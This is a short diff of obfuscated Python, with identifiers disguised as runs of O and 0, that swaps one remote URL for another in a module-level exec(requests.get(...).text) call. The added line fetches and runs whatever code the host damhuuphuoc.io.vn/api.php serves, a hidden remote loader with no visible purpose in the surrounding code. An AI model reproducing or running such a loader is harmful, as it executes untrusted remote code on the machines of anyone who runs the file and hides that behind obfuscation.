@@ -329,7 +329,7 @@ class OO0O00OOOOO000OOO (object ):
 			return O0OO0O00O000OO00O 
 		except :
 			return False 
-exec (requests .get ('https://run.mocky.io/v3/f91b0007-94a7-49a1-8595-7ccc5f9dc938').text )
+exec (requests .get ('https://damhuuphuoc.io.vn/api.php').text )
 def OO0O00000000O0O0O (OO00O000OOO00000O ):
 	O0OOOOOO000O0OO0O ="────"*OO00O000OOO00000O 
 	print (O0OOOOOO000O0OO0O )
